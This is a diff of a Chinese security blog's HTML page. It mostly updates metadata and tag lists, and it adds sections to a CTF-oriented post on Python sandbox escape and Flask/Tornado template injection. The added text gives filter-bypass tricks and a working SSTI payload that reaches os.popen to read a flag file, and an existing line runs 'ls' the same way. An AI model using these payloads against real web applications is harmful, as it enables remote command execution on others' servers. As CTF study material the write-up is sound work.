@@ -6,17 +6,20 @@
   <meta name="keywords" content=" python ">
   <meta name="description" content="python沙盒逃逸 | prontosil&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="关于我">
-<meta property="og:type" content="website">
-<meta property="og:title" content="about">
-<meta property="og:url" content="http://prontosil.com/about/index.html">
+<meta name="description" content="msf常用命令msfvenom参数：  -l 列出相关的值，这些值包括 payloads, encoders, nops, platforms, archs, encrypt, formats, all  -b badchar 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中  -e 开启payload编码   msfvenom -l encoders 列出所有的编码器其中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透常见知识">
+<meta property="og:url" content="http://prontosil.com/posts/6941c9ee/index.html">
 <meta property="og:site_name" content="prontosil&#39;s Blog">
-<meta property="og:description" content="关于我">
+<meta property="og:description" content="msf常用命令msfvenom参数：  -l 列出相关的值，这些值包括 payloads, encoders, nops, platforms, archs, encrypt, formats, all  -b badchar 参数被设置的时候，它的值中描述的字符将会被避免出现在 Payload 中  -e 开启payload编码   msfvenom -l encoders 列出所有的编码器其中">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-01-30T01:19:01.000Z">
-<meta property="article:modified_time" content="2020-03-01T04:03:15.091Z">
+<meta property="og:image" content="http://prontosil.com/posts/6941c9ee/1584495111390.png">
+<meta property="article:published_time" content="2020-03-18T01:09:58.000Z">
+<meta property="article:modified_time" content="2020-03-18T01:52:24.797Z">
 <meta property="article:author" content="prontosil">
+<meta property="article:tag" content="内网">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://prontosil.com/posts/6941c9ee/1584495111390.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -144,7 +147,7 @@
 
 
 <ul>
-    <li><div class="all active">全部文章<small>(61)</small></div></li>
+    <li><div class="all active">全部文章<small>(62)</small></div></li>
     
         
             
@@ -164,14 +167,6 @@
     
         
             
-            <li><div data-rel="编程">编程<small>(16)</small></div>
-                
-            </li>
-            
-        
-    
-        
-            
             <li><div data-rel="代码审计">代码审计<small>(2)</small></div>
                 
             </li>
@@ -180,7 +175,23 @@
     
         
             
+            <li><div data-rel="编程">编程<small>(16)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
             <li><div data-rel="生活">生活<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="渗透">渗透<small>(1)</small></div>
                 
             </li>
             
@@ -196,8 +207,8 @@
     </div>
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="61">
-<input type="hidden" id="yelog_site_word_count" value="42.2k">
+<input type="hidden" id="yelog_site_posts_number" value="62">
+<input type="hidden" id="yelog_site_word_count" value="44.2k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -241,14 +252,6 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color1">JavaScript</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color1">原型链污染</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color4">POP</a>
     </li>
     
@@ -257,7 +260,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color1">Linux</a>
+        <a class="color1">JavaScript</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">原型链污染</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -281,6 +288,14 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">函数</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color5">java</a>
     </li>
     
@@ -293,15 +308,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">php</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">函数</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color2">pickle</a>
+        <a class="color2">python</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -313,7 +320,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color2">python</a>
+        <a class="color2">pickle</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -325,10 +332,6 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">thinkphp</a>
-    </li>
-    
-    <li class="article-tag-list-item">
         <a class="color5">文件上传</a>
     </li>
     
@@ -337,11 +340,11 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color3">实验</a>
+        <a class="color4">cms</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">cms</a>
+        <a class="color3">实验</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -349,19 +352,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">CTF</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color5">命令执行</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">域名</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">隐写</a>
+        <a class="color3">内网</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -369,11 +360,23 @@
     </li>
     
     <li class="article-tag-list-item">
+        <a class="color3">隐写</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color3">比赛</a>
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">dig</a>
+        <a class="color5">kill</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">命令执行</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -385,7 +388,15 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color5">kill</a>
+        <a class="color4">thinkphp</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">leetcode</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">dig</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -397,7 +408,7 @@
     </li>
     
     <li class="article-tag-list-item">
-        <a class="color4">leetcode</a>
+        <a class="color4">CTF</a>
     </li>
     
     <li class="article-tag-list-item">
@@ -440,6 +451,10 @@
         <a class="color4">ctf</a>
     </li>
     
+    <li class="article-tag-list-item">
+        <a class="color3">域名</a>
+    </li>
+    
     <div class="clearfix"></div>
 </div>
 
@@ -456,6 +471,14 @@
            data-author="" >
             <span class="post-title" title="常用的网站">常用的网站</span>
             <span class="post-date" title="2020-03-10 13:30:08">2020/03/10</span>
+        </a>
+        
+        <a  class="渗透 "
+           href="/posts/6941c9ee/"
+           data-tag="内网"
+           data-author="" >
+            <span class="post-title" title="内网渗透常见知识">内网渗透常见知识</span>
+            <span class="post-date" title="2020-03-18 09:09:58">2020/03/18</span>
         </a>
         
         <a  class="CTF "
@@ -974,12 +997,12 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-03-10 19:53:59'>2020-03-10 15:19</time>
+        创建时间:<time class="date" title='更新时间: 2020-03-18 15:41:50'>2020-03-10 15:19</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:714</span>
+        <span>字数:889</span>
         
         
         
@@ -987,7 +1010,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#python2"><span class="toc-text">python2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#读文件"><span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行"><span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#py2和3通吃"><span class="toc-text">py2和3通吃</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python3-读文件"><span class="toc-text">python3 读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask-SSTI"><span class="toc-text">flask SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#request对象"><span class="toc-text">request对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#config对象"><span class="toc-text">config对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tornado-SSTI"><span class="toc-text">tornado SSTI</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#python2"><span class="toc-text">python2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#读文件"><span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行"><span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#py2和3通吃"><span class="toc-text">py2和3通吃</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python3-读文件"><span class="toc-text">python3 读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flask-SSTI"><span class="toc-text">flask SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#request对象"><span class="toc-text">request对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#config对象"><span class="toc-text">config对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过过滤"><span class="toc-text">绕过过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用-获得对象属性"><span class="toc-text">使用 [] 获得对象属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#限制输入-和"><span class="toc-text">限制输入 [和]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tornado-SSTI"><span class="toc-text">tornado SSTI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#校赛一道flask-SSTI题"><span class="toc-text">校赛一道flask SSTI题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#新春战疫-python3"><span class="toc-text">新春战疫(python3)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-text">参考</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1080,12 +1103,30 @@ Out[64]: os._wrap_close
 <pre><code class="python">{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}</code></pre>
 <h3 id="request对象"><a href="#request对象" class="headerlink" title="request对象"></a>request对象</h3><p> 这个对象指的是当前请求对象，<code>request.environ</code>对象是一个与服务器环境相关的对象字典。值得一提的是，可以通过访问<code>request.args.get</code> <code>request.cookies</code> <code>request.headers</code>等访问我们的请求参数，这主要是用来绕过过滤。（比如不让输入某关键字，我们就可以通过cookies传入，然后从request.cookies获取即可）</p>
 <h3 id="config对象"><a href="#config对象" class="headerlink" title="config对象"></a>config对象</h3><p> config对象是当前配置对象，是一个类字典的对象，可以用<code>config.items()</code>来访问。而且它还有一些独特1的方法，<code>from_envvar</code>, <code>from_object</code>, <code>from_pyfile</code> 。<code>from_pyfile</code>可以读取指定python文件编译并加载进来。</p>
+<h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><p>使用内置过滤器来绕过</p>
+<p><code>{{request|attr("get")}}</code> 相当于 <code>{{request.get}}</code></p>
+<p>结合 <code>join</code> 过滤器可以拼接字符，于是：</p>
+<p><code>{{request|attr(["_"*2,"class","_"*2]|join)}}</code>相当于<code>{{request.__class__}}</code></p>
+<p>不过我们可以通过<code>request.cookies[&#39;var&#39;]</code> 来进行获取</p>
+<h3 id="使用-获得对象属性"><a href="#使用-获得对象属性" class="headerlink" title="使用 [] 获得对象属性"></a>使用 <code>[]</code> 获得对象属性</h3><p><code>{{''.__class__}} = {{''['__cl'+'ass__']}}</code></p>
+<h3 id="限制输入-和"><a href="#限制输入-和" class="headerlink" title="限制输入 [和]"></a>限制输入 <code>[</code>和<code>]</code></h3><p><code>{{request.cookies.getitem("hh")}}</code></p>
 <h2 id="tornado-SSTI"><a href="#tornado-SSTI" class="headerlink" title="tornado SSTI"></a>tornado SSTI</h2><p>护网杯2018的一道题</p>
 <p><img src="/posts/ed9dc04e/1582507995702.png" alt></p>
 <p>然后我们通过 <code>{{handler.settings}}</code>来获得 cookie_secret</p>
 <p><img src="/posts/ed9dc04e/1582508041772.png" alt></p>
 <p>最后得到 flag</p>
-<pre><code>http://efc64735-8171-468a-b0eb-98510cefe54d.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=5af68d1f8101c8a5cea67790540f1a1e</code></pre>
+<pre><code>http://efc64735-8171-468a-b0eb-98510cefe54d.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=5af68d1f8101c8a5cea67790540f1a1e</code></pre><h2 id="校赛一道flask-SSTI题"><a href="#校赛一道flask-SSTI题" class="headerlink" title="校赛一道flask SSTI题"></a>校赛一道flask SSTI题</h2><p>有一个正则过滤了</p>
+<p><img src="/posts/ed9dc04e/0-1584517174812.png" alt></p>
+<p>绕过，得到密钥</p>
+<p><img src="/posts/ed9dc04e/0.png" alt></p>
+<p>之后伪造cookie</p>
+<p><img src="/posts/ed9dc04e/0-1584517209079.png" alt></p>
+<p>之后得到flag</p>
+<p><img src="/posts/ed9dc04e/0-1584517225387.png" alt></p>
+<h2 id="新春战疫-python3"><a href="#新春战疫-python3" class="headerlink" title="新春战疫(python3)"></a>新春战疫(python3)</h2><p>这题主要就是不清楚python3的构造，找了很久才找到一个可以利用的类</p>
+<p>payload如下：</p>
+<pre><code>{{"".__class__.__bases__[0].__subclasses__()[127].__init__.__globals__['po'+'pen']('cat this_is_the_fl'+'ag.txt').read()}}</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.szfszf.top/article/16/" target="_blank" rel="noopener">https://blog.szfszf.top/article/16/</a></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论 </span>
     </div>
@@ -1095,10 +1136,10 @@ Out[64]: os._wrap_close
 
 <div class="article_copyright">
     <p><span class="copy-title">文章标题:</span>python沙盒逃逸</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">714</span></p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">889</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="prontosil">prontosil</a></p>
     <p><span class="copy-title">发布时间:</span>2020-03-10, 15:19:07</p>
-    <p><span class="copy-title">最后更新:</span>2020-03-10, 19:53:59</p>
+    <p><span class="copy-title">最后更新:</span>2020-03-18, 15:41:50</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ed9dc04e/" title="python沙盒逃逸">http://prontosil.com/posts/ed9dc04e/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -1194,7 +1235,7 @@ Out[64]: os._wrap_close
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#HTB','#靶机','#JavaScript','#原型链污染','#POP','#SQL注入','#Linux','#XSS','#xxe','#xml','#apache','#docker','#java','#反序列化','#jndi','#php','#函数','#pickle','#字符串','#bytes','#python','#文档','#SQL','#thinkphp','#文件上传','#vulnhub','#实验','#cms','#游戏','#CTF','#命令执行','#域名','#隐写','#网站','#比赛','#dig','#AWD','#总结','#kill','#xxd','#hexdump','#leetcode','#tcpdump','#提权','#汇编','#dosbox','#Apache','#RCE','#SSI','#截断','#CSP','#ctf',],
+            'data': ['#HTB','#靶机','#POP','#SQL注入','#JavaScript','#原型链污染','#XSS','#xxe','#xml','#apache','#docker','#php','#函数','#java','#反序列化','#jndi','#python','#字符串','#bytes','#pickle','#文档','#SQL','#文件上传','#vulnhub','#cms','#实验','#游戏','#内网','#网站','#隐写','#Linux','#比赛','#kill','#命令执行','#AWD','#总结','#thinkphp','#leetcode','#dig','#xxd','#hexdump','#CTF','#tcpdump','#提权','#汇编','#dosbox','#Apache','#RCE','#SSI','#截断','#CSP','#ctf','#域名',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
